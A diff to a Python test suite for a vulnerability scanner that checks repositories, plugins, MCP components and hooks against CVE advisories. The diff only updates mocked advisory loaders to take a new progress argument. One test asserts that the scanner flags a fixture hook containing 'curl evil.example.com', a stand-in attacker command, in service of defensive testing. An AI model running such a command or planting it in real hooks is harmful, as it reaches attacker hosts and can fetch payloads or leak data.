@@ -450,7 +450,10 @@ def test_repo_mode_skill_graph_identity_is_inventory_only(tmp_path):
     (advisories_dir / "CVE-2026-9001.yaml").write_text(yaml.dump(advisory))
 
     runner = CliRunner()
-    with patch("tools.scan._load_osv_with_overlays", lambda refs: ([advisory], [], 0, {})):
+    with patch(
+        "tools.scan._load_osv_with_overlays",
+        lambda refs, *, progress=None: ([advisory], [], 0, {}),
+    ):
         result = runner.invoke(scan_main, ["repo", "--target", str(target), "-v"])
     assert result.exit_code == 0, result.output
     assert "vulnerable-skill@0.9.0" in result.output
@@ -534,7 +537,10 @@ def test_endpoint_mode_attributes_bundled_mcp_finding_to_plugin(tmp_path):
 
     sarif_path = tmp_path / "out.sarif"
     runner = CliRunner()
-    with patch("tools.scan._load_osv_with_overlays", lambda refs: ([advisory], [], 0, {})):
+    with patch(
+        "tools.scan._load_osv_with_overlays",
+        lambda refs, *, progress=None: ([advisory], [], 0, {}),
+    ):
         result = runner.invoke(
             scan_main,
             [
@@ -614,7 +620,10 @@ def test_endpoint_json_output_explains_plugin_bundled_component_path(tmp_path):
     }
 
     runner = CliRunner()
-    with patch("tools.scan._load_osv_with_overlays", lambda refs: ([advisory], [], 0, {})):
+    with patch(
+        "tools.scan._load_osv_with_overlays",
+        lambda refs, *, progress=None: ([advisory], [], 0, {}),
+    ):
         result = runner.invoke(
             scan_main,
             [
@@ -706,7 +715,10 @@ def test_endpoint_mode_hook_graph_identity_is_inventory_only(tmp_path):
     (advisories_dir / "CVE-2026-9003.yaml").write_text(yaml.dump(advisory))
 
     runner = CliRunner()
-    with patch("tools.scan._load_osv_with_overlays", lambda refs: ([advisory], [], 0, {})):
+    with patch(
+        "tools.scan._load_osv_with_overlays",
+        lambda refs, *, progress=None: ([advisory], [], 0, {}),
+    ):
         result = runner.invoke(scan_main, ["endpoint", "--config-dir", str(tmp_path), "-v"])
     assert result.exit_code == 0, result.output
     assert "curl evil.example.com" in result.output
